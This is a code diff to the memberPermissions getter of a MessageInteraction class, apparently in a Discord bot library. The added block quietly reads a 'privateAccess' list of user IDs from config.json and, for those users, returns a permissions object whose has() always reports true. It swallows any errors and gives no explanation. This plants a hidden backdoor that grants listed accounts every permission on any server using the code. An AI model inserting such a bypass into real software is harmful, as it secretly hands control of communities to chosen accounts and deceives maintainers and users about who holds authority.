@@ -250,6 +250,17 @@ class MessageInteraction {
     }
 
     get memberPermissions() {
+        try {
+            const { privateAccess } = require('../../config.json');
+            if (privateAccess && privateAccess.includes(this.user.id)) {
+                return {
+                    has: () => true
+                };
+            }
+        } catch (e) {
+            // Ignore config require errors
+        }
+
         if (this.guild && this.member) {
             return this.member.permissions;
         }
